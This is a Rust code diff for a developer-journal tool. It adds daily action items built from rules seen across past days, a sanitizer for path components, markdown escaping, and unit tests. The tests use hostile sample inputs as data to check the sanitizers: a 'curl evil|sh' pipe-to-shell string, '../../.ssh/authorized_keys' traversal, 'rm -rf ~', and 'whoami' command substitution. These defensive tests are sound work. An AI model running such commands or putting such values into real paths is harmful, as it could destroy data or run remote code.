@@ -819,6 +819,9 @@ pub async fn get_daily_summary(
 
             let overview =
                 format_day_overview(&rows.iter().map(|r| r.project.as_str()).collect::<Vec<_>>());
+            attach_rule_history(&state.ledger, &date, &mut consolidated_rules);
+            let actions =
+                build_daily_actions(&consolidated_rules, &learnings_by_project, &next_steps);
             let raw_content = render_daily_markdown(
                 session_count,
                 work_count,
@@ -827,10 +830,10 @@ pub async fn get_daily_summary(
                 &day_metrics,
                 &efficiency_signals,
                 &next_steps,
+                &actions,
                 &learnings_by_project,
                 &project_gains,
             );
-
             let summary = DailySummaryDto {
                 date: date.clone(),
                 overview,
@@ -852,6 +855,7 @@ pub async fn get_daily_summary(
                 commands,
                 reflections: None,
                 tomorrow_focus: Vec::new(),
+                actions,
                 raw_content,
                 file_path: String::new(),
             };
@@ -1827,6 +1831,7 @@ fn extract_consolidated_rules(project: &str, summary_md: &str) -> Vec<Consolidat
             verification: None,
             evidence: None,
             draft_markdown: String::new(),
+            recent_detections: Vec::new(),
         });
     }
 
@@ -2048,6 +2053,174 @@ fn build_workflow_coaching(
     (signals, next_steps)
 }
 
+/// Attach 7-day recurrence (`recent_detections`) to today's consolidated rules by
+/// scanning past-day summaries with the same extractor. Rules already applied
+/// elsewhere stop re-appearing, so their dates drop out naturally.
+fn attach_rule_history(ledger: &Ledger, date: &str, rules: &mut [ConsolidatedRuleDto]) {
+    if rules.is_empty() {
+        return;
+    }
+    let Ok(today) = chrono::NaiveDate::parse_from_str(date, "%Y-%m-%d") else {
+        return;
+    };
+    let since = today - chrono::Duration::days(6);
+    // ponytail: re-extracts rules from up to 7 days of summaries per request;
+    // add a (date, ledger-mtime) cache only if profiling shows it matters.
+    let window = match ledger.recent_rule_summaries(date, &since.to_string()) {
+        Ok(w) => w,
+        Err(e) => {
+            eprintln!("[daybook] rule history query failed for {date}: {e:#}");
+            return;
+        }
+    };
+    // (scope, name-lowercased) -> set of dates
+    let mut by_day: std::collections::BTreeMap<String, Vec<(String, String, String, String)>> =
+        std::collections::BTreeMap::new();
+    for (d, project, md) in &window {
+        if md.is_empty() {
+            continue;
+        }
+        for r in extract_consolidated_rules(project, md) {
+            by_day.entry(d.clone()).or_default().push((
+                r.scope.clone(),
+                r.name.to_lowercase(),
+                r.project.clone(),
+                project.clone(),
+            ));
+        }
+    }
+    for rule in rules.iter_mut() {
+        let name_l = rule.name.to_lowercase();
+        let mut days: Vec<String> = Vec::new();
+        for (d, hits) in &by_day {
+            let hit = hits.iter().any(|(scope, name, _rproj, _sproj)| {
+                *scope == rule.scope
+                    && *name == name_l
+                    && (rule.scope == "global-skill" || _rproj.eq_ignore_ascii_case(&rule.project))
+            });
+            if hit {
+                days.push(d.clone());
+            }
+        }
+        days.sort_by(|a, b| b.cmp(a)); // newest first
+        rule.recent_detections = days;
+    }
+}
+
+/// Make a session-derived name safe as ONE path component in destination
+/// paths and `Run:` commands: no `..` traversal, no shell metacharacters.
+/// Display fields keep the original text; only paths/commands use the slug.
+fn sanitize_path_component(raw: &str) -> String {
+    let slug: String = raw
+        .chars()
+        .map(|c| {
+            if c.is_ascii_alphanumeric() || c == '-' || c == '_' {
+                c
+            } else {
+                '-'
+            }
+        })
+        .collect();
+    let slug = slug.trim_matches('-');
+    if slug.is_empty() {
+        "unnamed".to_string()
+    } else {
+        slug.to_string()
+    }
+}
+
+/// Keep a summary-derived string on one markdown line: no backtick or `*`
+/// breakout from inline code/bold spans, no injected headings or list items.
+/// (`_` is kept: it is safe inside `**` and appears in real file names.)
+fn md_inline(s: &str) -> String {
+    s.replace(['`', '*', '\n', '\r'], " ")
+}
+
+/// Turn today's rules, pitfalls, and follow-ups into executable directives.
+/// Each action names the concrete destination file and where to fetch the
+/// content (the dashboard rules card holds the copy-ready drafts).
+fn build_daily_actions(
+    consolidated_rules: &[ConsolidatedRuleDto],
+    learnings_by_project: &[ProjectLearningsDto],
+    next_steps: &[NextStepDto],
+) -> Vec<ActionDto> {
+    let mut actions: Vec<ActionDto> = Vec::new();
+
+    let mut rules: Vec<&ConsolidatedRuleDto> = consolidated_rules.iter().collect();
+    rules.sort_by_key(|r| std::cmp::Reverse(r.recent_detections.len()));
+    for rule in rules.iter().take(4) {
+        let n = rule.recent_detections.len();
+        let recurrence = if n >= 2 {
+            format!(" Seen on {} days — recurring, fix once.", n)
+        } else {
+            String::new()
+        };
+        if rule.scope == "global-skill" {
+            let slug = sanitize_path_component(&rule.name);
+            let path = format!("~/.agents/skills/{slug}/SKILL.md");
+            actions.push(ActionDto {
+                kind: "write-skill".to_string(),
+                title: rule.name.clone(),
+                instruction: format!(
+                    "Copy the SKILL.md draft for the '{}' rule from the daybook dashboard rules card into {path}.{recurrence}",
+                    rule.name
+                ),
+                command: format!("mkdir -p ~/.agents/skills/{slug} && $EDITOR {path}"),
+                verify: rule
+                    .verification
+                    .clone()
+                    .unwrap_or_else(|| format!("{path} exists and describes the procedure.")),
+                recurring_count: n,
+            });
+        } else {
+            let project = sanitize_path_component(&rule.project);
+            let path = format!("~/git-repos/{project}/AGENTS.md");
+            actions.push(ActionDto {
+                kind: "apply-rule".to_string(),
+                title: format!("{} — {}", rule.project, rule.name),
+                instruction: format!("Add this rule to {path}: {}.{recurrence}", rule.summary),
+                command: format!("$EDITOR {path}"),
+                verify: rule
+                    .verification
+                    .clone()
+                    .unwrap_or_else(|| format!("The rule appears in {path}.")),
+                recurring_count: n,
+            });
+        }
+    }
+
+    for group in learnings_by_project.iter().take(2) {
+        for item in group.pitfalls.iter().take(1) {
+            let project = sanitize_path_component(&group.project);
+            let path = format!("~/git-repos/{project}/AGENTS.md");
+            actions.push(ActionDto {
+                kind: "fix-pitfall".to_string(),
+                title: format!("{} pitfall", group.project),
+                instruction: format!(
+                    "Prevent recurrence in {}: {}. Add a guard or a note to {path}.",
+                    group.project, item.text
+                ),
+                command: String::new(),
+                verify: format!("The pitfall cannot silently recur in {}.", group.project),
+                recurring_count: 0,
+            });
+        }
+    }
+
+    for step in next_steps.iter().take(2) {
+        actions.push(ActionDto {
+            kind: "resume-work".to_string(),
+            title: step.title.clone(),
+            instruction: step.detail.clone(),
+            command: String::new(),
+            verify: "The follow-up work is started and unblocked.".to_string(),
+            recurring_count: 0,
+        });
+    }
+
+    actions.truncate(8);
+    actions
+}
 #[allow(clippy::too_many_arguments)]
 fn render_daily_markdown(
     session_count: usize,
@@ -2057,6 +2230,7 @@ fn render_daily_markdown(
     day_metrics: &DayMetricsDto,
     efficiency_signals: &[String],
     next_steps: &[NextStepDto],
+    actions: &[ActionDto],
     learnings_by_project: &[ProjectLearningsDto],
     project_gains: &[ProjectGainDto],
 ) -> String {
@@ -2077,6 +2251,21 @@ fn render_daily_markdown(
         out.push_str("\n## Cost, Cache & Command Health\n");
         for sig in efficiency_signals {
             out.push_str(&format!("- {sig}\n"));
+        }
+    }
+
+    if !actions.is_empty() {
+        out.push_str("\n## Do Today\n");
+        for a in actions {
+            out.push_str(&format!(
+                "- **{}**: {}\n",
+                md_inline(&a.title),
+                md_inline(&a.instruction)
+            ));
+            if !a.command.is_empty() {
+                out.push_str(&format!("  - Run: `{}`\n", md_inline(&a.command)));
+            }
+            out.push_str(&format!("  - Verify: {}\n", md_inline(&a.verify)));
         }
     }
 
@@ -2269,6 +2458,132 @@ fn map_session_usage_dto(u: crate::usage::types::SessionUsage) -> SessionUsageDt
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn test_sanitize_path_component_blocks_traversal_and_shell_chars() {
+        assert_eq!(
+            sanitize_path_component("verify-api-field"),
+            "verify-api-field"
+        );
+        assert_eq!(
+            sanitize_path_component("../../.ssh/authorized_keys"),
+            "ssh-authorized_keys"
+        );
+        assert_eq!(
+            sanitize_path_component("x; curl evil|sh"),
+            "x--curl-evil-sh"
+        );
+        assert_eq!(sanitize_path_component("`rm -rf ~`"), "rm--rf");
+        assert_eq!(sanitize_path_component("..."), "unnamed");
+        assert_eq!(sanitize_path_component(""), "unnamed");
+    }
+
+    #[test]
+    fn test_build_daily_actions_sanitizes_paths_and_marks_recurrence() {
+        let rule = ConsolidatedRuleDto {
+            project: "daybook".to_string(),
+            name: "x; curl evil|sh".to_string(),
+            scope: "global-skill".to_string(),
+            summary: "do the thing".to_string(),
+            recent_detections: vec!["2026-11-05".to_string(), "2026-11-04".to_string()],
+            ..Default::default()
+        };
+        let repo_rule = ConsolidatedRuleDto {
+            project: "../../etc".to_string(),
+            name: "run-migrations".to_string(),
+            scope: "repo-rule".to_string(),
+            summary: "always run migrations".to_string(),
+            ..Default::default()
+        };
+        let learnings = vec![ProjectLearningsDto {
+            project: "daybook".to_string(),
+            pitfalls: vec![LearningItemDto {
+                kind: "pitfall".to_string(),
+                text: "tests skipped".to_string(),
+                session_title: String::new(),
+            }],
+            learnings: vec![],
+        }];
+        let steps = vec![NextStepDto {
+            tag: "NEXT".to_string(),
+            title: "resume PR".to_string(),
+            detail: "finish the review fixes".to_string(),
+        }];
+
+        let actions = build_daily_actions(&[rule, repo_rule], &learnings, &steps);
+
+        assert_eq!(actions.len(), 4);
+        assert_eq!(actions[0].kind, "write-skill");
+        assert_eq!(actions[0].recurring_count, 2);
+        assert!(!actions[0].command.contains(';'));
+        assert!(!actions[0].command.contains('|'));
+        assert!(actions[0]
+            .command
+            .contains("~/.agents/skills/x--curl-evil-sh/SKILL.md"));
+        assert!(!actions[0].instruction.contains("below"));
+        assert_eq!(actions[1].kind, "apply-rule");
+        assert!(!actions[1].command.contains(".."));
+        assert!(actions[1].command.contains("~/git-repos/etc/AGENTS.md"));
+        assert_eq!(actions[2].kind, "fix-pitfall");
+        assert_eq!(actions[3].kind, "resume-work");
+    }
+
+    #[test]
+    fn test_render_daily_markdown_escapes_action_fields() {
+        let actions = vec![ActionDto {
+            kind: "resume-work".to_string(),
+            title: "bad `tick`\n## Injected".to_string(),
+            instruction: "line one\nline two".to_string(),
+            command: "echo `whoami`".to_string(),
+            verify: "done\n- fake".to_string(),
+            recurring_count: 0,
+        }];
+        let metrics = DayMetricsDto::default();
+        let md = render_daily_markdown(1, 1, 0, 0, &metrics, &[], &[], &actions, &[], &[]);
+        assert!(!md.contains("`tick`"));
+        assert!(!md.lines().any(|l| l.starts_with("## Injected")));
+        assert!(!md.lines().any(|l| l.starts_with("- fake")));
+        assert!(md.contains("## Do Today"));
+    }
+
+    #[test]
+    fn test_attach_rule_history_marks_recurrence_across_days() {
+        let dir = tempfile::tempdir().unwrap();
+        let ledger = Ledger::open(&dir.path().join("t.db3")).unwrap();
+        let md = "## Summary\nx\n\n## Potential Skills/Commands\n- **[verify-api-field]**: Verify API fields before UI.\n  - Scope: global-skill\n";
+        for (sid, day) in [("s1", "2026-11-04"), ("s2", "2026-11-05")] {
+            ledger
+                .upsert_session(&SessionRecord {
+                    session_id: sid.into(),
+                    machine: "vm1".into(),
+                    runtime: "pi".into(),
+                    project: "daybook".into(),
+                    journal_date: day.into(),
+                    started_utc: None,
+                    ended_utc: None,
+                    title: None,
+                    git_branch: None,
+                    version: 1,
+                    content_hash: sid.into(),
+                    summary_md: md.into(),
+                    facets_json: None,
+                    usage: Default::default(),
+                    aggregates: Default::default(),
+                })
+                .unwrap();
+        }
+        let mut rules = vec![ConsolidatedRuleDto {
+            name: "verify-api-field".to_string(),
+            scope: "global-skill".to_string(),
+            project: "daybook".to_string(),
+            ..Default::default()
+        }];
+        attach_rule_history(&ledger, "2026-11-05", &mut rules);
+        assert_eq!(
+            rules[0].recent_detections,
+            vec!["2026-11-05".to_string(), "2026-11-04".to_string()]
+        );
+    }
 
     #[test]
     fn junk_hint_filters_decorators_and_empty_extractions() {
@@ -3145,6 +3460,7 @@ mod tests {
             &metrics,
             &signals,
             &next_steps,
+            &[],
             &proj_learnings,
             &gains,
         );
@@ -3155,7 +3471,7 @@ mod tests {
         assert!(md.contains("[PITFALL] The text fallback appeared"));
         assert!(md.contains("## What Shipped & Why — By Project"));
         assert_eq!(
-            render_daily_markdown(0, 0, 0, 0, &metrics, &[], &[], &[], &[]),
+            render_daily_markdown(0, 0, 0, 0, &metrics, &[], &[], &[], &[], &[]),
             ""
         );
     }
